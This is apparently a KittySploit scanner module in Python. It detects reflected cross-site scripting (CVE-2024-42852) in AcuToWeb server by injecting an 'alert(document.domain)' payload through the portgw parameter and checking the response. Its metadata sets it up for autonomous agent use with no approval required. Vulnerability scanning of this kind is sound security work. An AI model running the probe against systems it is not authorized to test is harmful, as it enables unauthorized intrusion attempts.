#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AcuToWeb server/10."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AcuToWeb server/10.5.0.7577c8b - Cross-Site Scripting Detection',
        'description': 'AcuToWeb server/10.5.0.7577c8b is vulnerable to reflected cross-site scripting (XSS) via the portgw parameter. Unsanitized user input is reflected in the response, allowing arbitrary JavaScript execution.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'xss', 'acutoweb', 'opentext', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/Hebing123/cve/issues/64', 'https://nvd.nist.gov/vuln/detail/CVE-2024-42852'],
        'cve': 'CVE-2024-42852',
    }

    def run(self):
        path = '/?portgw=80089948;%20alert(document.domain)'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('80089948; alert(document.domain);', 'WT_GW_PORT',)
        ctype_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='AcuToWeb server/10.5.0.7577c8b - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

